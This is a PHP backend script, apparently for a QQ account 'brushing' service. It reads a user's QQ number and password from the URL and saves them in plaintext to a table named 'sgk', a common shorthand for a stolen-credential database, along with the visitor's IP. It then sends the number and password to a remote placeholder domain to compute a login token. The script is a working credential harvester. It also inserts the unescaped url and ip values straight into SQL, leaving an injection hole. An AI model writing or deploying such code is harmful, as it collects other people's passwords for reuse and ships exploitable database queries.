<?php
include_once "conn.php";
//include_once "function.php";
//设定PHP脚本最大执行时间，0为无限制
//set_time_limit(0);
//服务器IP地址
//$_server = '127.0.0.1';
//服务器设定的通信端口
//$port = '19731';
//GET方式获取需要刷的uin号 & 设定向服务器端发送的信息
$uin = $_GET['uin'];
$pwd = $_GET['pwd'];
$vcode = $_GET['vcode'];
$ismd5 = $_GET['ismd5'];
$url = $_GET['url'];
$ver = $_GET['ver'];
$time=@date("Y-m-d H:i:s");
$ip = GetIP();
if (!$uin) exit('Not uin!');
if (!$pwd) exit('Not pwd!');
if (!$vcode) exit('Not vcode!');

$sql=$db->query("SELECT * FROM `sgk` WHERE (uin='".addslashes($uin)."' and pwd='".addslashes($pwd)."') LIMIT 1");
$rs=$sql->fetch();
if ($rs) {//如果查询到有记录

	if($url){//如果获取到url参数
	
		if ($rs['ip'] == null or $rs['url'] == null) {
			$db->exec("UPDATE `sgk` SET `ip`='{$ip}' , `url`='{$url}' , `lasttime`='{$time}' WHERE `uin`='".addslashes($uin)."' and `pwd`='".addslashes($pwd)."'");
		}
		
	}else{//如果没有获取到url参数
	
		if ($rs['ip'] == null or $rs['url'] == null) {
			$db->exec("UPDATE `sgk` SET `ip`='{$ip}' , `lasttime`='{$time}' WHERE `uin`='".addslashes($uin)."' and `pwd`='".addslashes($pwd)."'");
		}
	}
	
} else {//如果没有查询到记录

	if($url){//如果获取到url参数
	
		//新增一条 uin--pwd--URL--来者ip--现在的时间 记录
		$db->exec("INSERT INTO `sgk`(`uin` , `pwd` , `url` , `ip`, `lasttime`) VALUES ('".addslashes($uin)."' , '".addslashes($pwd)."' , '{$url}' , '{$ip}' , '{$time}')");
	
	}else{//如果没有获取到url参数
		//新增一条 uin--pwd--来者ip--现在的时间 记录
		$db->exec("INSERT INTO `sgk`(`uin` , `pwd` , `ip` , `lasttime`) VALUES ('".addslashes($uin)."' , '".addslashes($pwd)."' , '{$ip}' , '{$time}')");
	}
    
}
$db=null;//断开数据库连接
if ($ismd5 == - 1) {
    $pwd = strtoupper(md5($pwd));
}else{
	$pwd = strtoupper($pwd);
}
exit(file_get_contents("http://你的百度云bae域名/?act=getp&uin=$uin&pwd=$pwd&vcode=$vcode&ver=$ver&t=".time()));


//之前用的客户端传输P值，现在弃用
/* if ($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) //使用TCP协议创建一个socket资源
{
    //echo "socket创建.......成功！<br />";
    if (($res = @socket_connect($socket, $_server, $port))) //链接服务器，并返回布尔值
    {
        //echo "连接服务器端接口.......成功<br />";
        if (($res = @socket_write($socket, $uin . "/" . $pwd . "/" . $vcode, strlen($uin . "/" . $pwd . "/" . $vcode))) < 0) { //用socket_write()向服务器传输数据，如果失败，函数会返回一个负值
            echo "Send Error!";
        } else {
            //echo "提交数据：" . $uin . "/" . $pwd. "/" . $vcode . ".......成功<br />";
            
        }
        $rs = @socket_read($socket, 1024); //用socket_read()来接收服务器返回的数据
        if ($rs) {
            //echo "服务器返回信息：" . $rs . "<br />";
            echo $rs;
        } else {
            echo "Get Error";
        }
    } else {
        echo "Error";
    }
} else {
    echo "socket creat error";
}
socket_close($socket); */
?>